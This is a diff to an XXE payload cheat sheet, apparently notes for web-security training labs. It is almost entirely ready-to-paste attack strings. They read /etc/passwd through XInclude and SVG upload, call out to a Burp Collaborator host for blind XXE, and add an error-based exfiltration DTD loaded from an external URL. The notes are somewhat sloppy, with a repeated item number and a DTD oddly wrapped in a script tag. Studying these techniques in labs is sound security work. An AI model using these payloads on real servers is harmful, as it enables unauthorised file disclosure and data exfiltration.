@@ -8,3 +8,11 @@
 3)Blind XXE Injection  ---> Use this Script ---> <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
 4)Exploting Xinclude to retrieve files ---> In the value parameter such as <productid>1</productid> ----> replace the 1 with ---> <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 4)SVG File Upload ---> Create a local SVG file ---> Replace the original content with ---> <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+5)Exploiting Blind-XXE via Error Messages in Externally Hosted Server
+    --->Copy this inside script
+    ----> <script> <!ENTITY % file SYSTEM "file:///etc/passwd">
+                   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+                   %eval;
+                   %exfil;
+          </script>
+    ---> Insert this --><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]> 
